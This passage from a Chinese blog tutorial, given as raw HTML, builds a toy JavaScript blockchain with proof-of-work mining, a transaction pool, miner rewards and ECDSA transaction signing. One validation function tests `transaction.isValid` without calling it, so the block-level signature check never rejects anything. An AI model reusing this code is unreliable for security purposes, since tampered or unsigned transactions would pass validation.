class="hljs-title function_">getAnswer</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">Ans</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> u = <span class="hljs-number">0</span>; u &lt; difficulty; u++) &#123;<br>      <span class="hljs-title class_">Ans</span> += <span class="hljs-string">&#x27;0&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Ans</span><br>  &#125;<br><br><span class="hljs-comment">// 挖！</span><br>  <span class="hljs-title function_">mine</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, difficulty) === <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnswer</span>(difficulty))<br>        <span class="hljs-comment">// 进行前缀比对</span><br>        <span class="hljs-keyword">break</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span>++<br>    &#125;<br>  &#125;<br><br><br><span class="hljs-comment">/////////// class Chain ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// 一个链中应由多个区块组成所以赋值成数组</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span> = <span class="hljs-number">3</span> <span class="hljs-comment">// 设置难度为3，也就是需要hash满足前缀三位全为0</span><br>  &#125;<br><br><span class="hljs-comment">// 手动增加区块</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// 因为在外部无法得知此时的preHash是什么，所以手动赋值</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()在Block类是构造时候调用的，但是newBlock传入的时候没有preHash，所以构造的Hash是错的，需要重新生成</span><br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>) <span class="hljs-comment">// 进行比对前缀</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// 别忘了往链上添加</span><br>  &#125;<br><br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124154532552.png" alt="image-20231124154532552"></p><p>观察发现在<code>nonce</code>为4649和3687时得到可行的<code>hash</code></p><h2 id="3、创造自己的数字货币"><a href="#3、创造自己的数字货币" class="headerlink" title="3、创造自己的数字货币"></a>3、创造自己的数字货币</h2><p>既然说货币，那便是用来交易的</p><p>所以我们可以把上述的<code>Block</code>类中的<code>data</code>改变为交易内容<code>Transaction</code>，以实现转账</p><p>所以我们追加一个<code>Transaction</code>类，既然是交易，那必然包含</p><ul><li>转账人</li><li>收款人</li><li>数额</li><li>时间</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount, timeStamp</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// 发送者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// 接收者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// 转账数量</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> = timeStamp<br>  &#125;<br>    <br>    <span class="hljs-comment">// 生成对应数据的hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span>  + <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">transactions<span class="hljs-comment">/* data */</span>, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span> = transactions <span class="hljs-comment">// 本来是this.data = data</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// 挖的次数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>  &#125;<br><br><span class="hljs-comment">// 生成该区块的Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) + <span class="hljs-comment">// Transaction是对象，所以用JSON.stringify将其字符化</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> <br>    ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br></code></pre></td></tr></table></figure><p>但是上述的时间戳<code>timeStamp</code>在比特币作者的论文里，是要在<code>block</code>中进行生成的，而不是在<code>Transaction</code>，所以进行修改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount, timeStamp</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// 发送者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// 接收者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// 转账数量</span><br>    <span class="hljs-comment">// this.timeStamp = timeStamp</span><br>  &#125;<br>    <br>    <span class="hljs-comment">// 生成对应数据的hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> <span class="hljs-comment">/* + this.timeStamp */</span>).<span class="hljs-title function_">toString</span>()<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">transactions<span class="hljs-comment">/* data */</span>, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span> = transactions <span class="hljs-comment">// 本来是this.data = data</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// 挖的次数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() <span class="hljs-comment">// 在Block类中进行生成</span><br>  &#125;<br><br><span class="hljs-comment">// 生成该区块的Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) + <span class="hljs-comment">// Transaction是对象，所以用JSON.stringify将其字符化</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> <span class="hljs-comment">// 在这里添加</span><br>    ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br></code></pre></td></tr></table></figure><p>上面写道把data改为Transaction交易数据</p><p>所以现在的这个区块链相当于一个池子（TransactionPool）装满了交易（Transaction）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// 一个链中应由多个区块组成所以赋值成数组</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span> = <span class="hljs-number">3</span> <span class="hljs-comment">// 设置难度为3，也就是需要hash满足前缀三位全为0</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span> = [] <span class="hljs-comment">// 装载交易数据的pool</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">minerReward</span> = <span class="hljs-number">50</span> <span class="hljs-comment">// 奖励数额，随着挖的区块数量越多随之减半</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>这时候我们回到先前的<code>addBlock</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 手动增加区块</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// 因为在外部无法得知此时的preHash是什么，所以手动赋值</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()在Block类是构造时候调用的，但是newBlock传入的时候没有preHash，所以构造的Hash是错的，需要重新生成</span><br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>) <span class="hljs-comment">// 进行比对前缀</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// 别忘了往链上添加</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>这个方法实际上是为了我们调试用的，实际运用中并不能直接增加</p><p>实际中，我们是在慢慢的挖区块，这里假定有个矿工在帮我们挖矿，当他挖到区块链便会获得相应的矿工奖励，奖励的发放依然通过<code>Transaction</code>来发放</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 交易池</span><br>  <span class="hljs-title function_">mineTransactionPool</span>(<span class="hljs-params">minerAddr</span>) &#123;<br>    <span class="hljs-comment">// 先给矿工发钱</span><br>    <span class="hljs-keyword">const</span> minerTransaction = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;&#x27;</span>, minerAddr, <span class="hljs-variable language_">this</span>.<span class="hljs-property">minerReward</span>) <span class="hljs-comment">// 因为矿工奖励由区块链本体发放，所以地址为空</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(minerTransaction) <span class="hljs-comment">// 往pool储存</span><br>    <span class="hljs-comment">// 开挖</span><br>    <span class="hljs-keyword">const</span> newBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span>)<br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>)<br>    <span class="hljs-comment">// 把区块加到区块链当中</span><br>    <span class="hljs-comment">// 同时清空此时的Pool</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// 把挖到的区块放入链</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span> = [] <span class="hljs-comment">// 当挖到合法区块，且放入链后，清空pool</span><br>  &#125;<br><br> <span class="hljs-comment">// 方便添加Transaction到Pool</span><br>  <span class="hljs-title function_">addTransaction</span>(<span class="hljs-params">transaction</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(transaction)<br>  &#125;<br><br><br><span class="hljs-keyword">const</span> fanCoin = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> t1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;addr1&#x27;</span>, <span class="hljs-string">&#x27;addr2&#x27;</span>, <span class="hljs-number">10</span>)<br><span class="hljs-keyword">const</span> t2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;addr2&#x27;</span>, <span class="hljs-string">&#x27;addr1&#x27;</span>, <span class="hljs-number">20</span>)<br>fanCoin.<span class="hljs-title function_">addTransaction</span>(t1)<br>fanCoin.<span class="hljs-title function_">addTransaction</span>(t2)<br>fanCoin.<span class="hljs-title function_">mineTransactionPool</span>(<span class="hljs-string">&#x27;fan&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanCoin)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanCoin.<span class="hljs-property">chain</span>[<span class="hljs-number">1</span>].<span class="hljs-property">transactions</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231126001059276.png" alt="image-20231126001059276"></p><h2 id="4、数字签名"><a href="#4、数字签名" class="headerlink" title="4、数字签名"></a>4、数字签名</h2><p>上节我们实现了简易的数字货币，但是可以发现Transaction（交易）可以由任何人发起，而且也可以不经过你的批准而使用你钱包的钱，<del>这显然不行，怎么能动我的小金库</del></p><p>所以在发起转账前，需要做出相应的验证措施，这就要用到了本节的数字签名</p><p>这里我们使用的是非对称加密</p><ul><li>通过公开<code>Transaction</code>，<code>Public Key</code>与<code>Signature</code>，可以让其他所有人校验这个签名的合法性，证明这个交易属于你</li><li>同时，只有验证通过才能执行转账操作，<del>保护了你的小金库</del></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ecLib = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;elliptic&#x27;</span>).<span class="hljs-property">ec</span><br><span class="hljs-keyword">const</span> ec = <span class="hljs-keyword">new</span> <span class="hljs-title function_">ecLib</span>(<span class="hljs-string">&#x27;secp256k1&#x27;</span>) <span class="hljs-comment">// 椭圆曲线</span><br><br><span class="hljs-comment">/////////// class Transaction ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount</span>) &#123;<br>    <span class="hljs-comment">// if (from === null || from == &#x27;&#x27;) // 视频里没说，但是我觉得应该检验一下（这样检验不太行</span><br>        <span class="hljs-comment">// throw new Error(&#x27;Transaction cannot be empty!&#x27;)</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// 这里从id改成了发送者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// 同理，接收者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// 转账数量</span><br>    <span class="hljs-comment">// this.timeStamp = timeStamp</span><br>  &#125;<br><br>  <span class="hljs-comment">// 对交易进行签名</span><br>  <span class="hljs-comment">// 签名的意义是将公钥和Transaction公开使所有人都能对此交易进行校验，凭此证明其合法性</span><br>  <span class="hljs-title function_">sign</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">signature</span> = key.<span class="hljs-title function_">sign</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>(), <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toDER</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>  &#125;<br><br>  <span class="hljs-comment">// 检查交易合法性</span><br>  <span class="hljs-title function_">isValid</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 对矿工奖励进行特殊判断</span><br>    <span class="hljs-comment">// 因为矿工奖励是区块链给矿工转账，所以公钥是空</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> === <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-keyword">const</span> keyObj = ec.<span class="hljs-title function_">keyFromPublic</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span>, <span class="hljs-string">&#x27;hex&#x27;</span>)<br>    <span class="hljs-keyword">return</span> keyObj.<span class="hljs-title function_">verify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>(), <span class="hljs-variable language_">this</span>.<span class="hljs-property">signature</span>) <span class="hljs-comment">// 检验Signature是否合法</span><br>  &#125;<br><br><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// 方便添加Transaction到Pool</span><br>  <span class="hljs-title function_">addTransaction</span>(<span class="hljs-params">transaction</span>) &#123;<br>    <span class="hljs-comment">// 检验transaction是否合法</span><br>    <span class="hljs-keyword">if</span> (!transaction.<span class="hljs-title function_">isValid</span>())<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Found InValid Transaction before adding to pool!&#x27;</span>)<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(transaction)<br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231216163810985.png" alt="image-20231216163810985"></p><p><img src="/posts/32752/image-20231216162204074.png" alt="image-20231216162204074"></p><p>可以看到验证成功，现在我们手动篡改一下，尝试一下</p><p><img src="/posts/32752/image-20231216163925741.png" alt="image-20231216163925741"></p><p>把<code>amount</code>改成20</p><p><img src="/posts/32752/image-20231216163843479.png" alt="image-20231216163843479"></p><p>可以看到输出了<code>false</code>，并丢出来错误，且并没有往<code>Transactions</code>中放入错误的交易</p><p>这时候，在之前验证区块是否一一相连时，我们也应该加上验证</p><p>由于区块中可能有多个<code>Transaction</code>，所以采用穷举依次验证</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Block ///////////</span><br><br><br><span class="hljs-comment">// 逐个验证transaction是否合法</span><br>  <span class="hljs-title function_">validateTransaction</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> transaction <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) &#123;<br>      <span class="hljs-keyword">if</span> (!transaction.<span class="hljs-property">isValid</span>)<br>        <span class="hljs-comment">// throw new Error(&quot;Found inValid Transaction!&quot;)</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br><br><span class="hljs-comment">// 挖！</span><br>  <span class="hljs-title function_">mine</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateTransaction</span>()<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, difficulty) === <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnswer</span>(difficulty))<br>        <span class="hljs-comment">// 进行前缀比对</span><br>        <span class="hljs-keyword">break</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span>++<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// 对区块进行校验</span><br>  <span class="hljs-title function_">validateChain</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> === <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-property">hash</span> !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>      <span class="hljs-comment">// 对初始进行校验，原始的Hash与再次生成的Hash进行对比</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span>; i++) &#123;<br>      <span class="hljs-comment">// 验证Block的每个Transaction是否合法</span><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i].<span class="hljs-title function_">validateTransaction</span>())<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Found InValid Transaction while validating Chain&#x27;</span>)<br><br>      <span class="hljs-comment">// 判断当前Block的data是否被篡改8</span><br>      <span class="hljs-keyword">const</span> blockToValidate = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i]<br>      <span class="hljs-keyword">if</span> (blockToValidate.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>      <span class="hljs-comment">// 比对前一个Block与当前Block的hash值是否相同</span><br>      <span class="hljs-keyword">const</span> preBlock = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i - <span class="hljs-number">1</span>]<br>      <span class="hljs-keyword">if</span> (preBlock.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-property">preHash</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231217025145782.png" alt="image-20231217025145782"></p><p><img 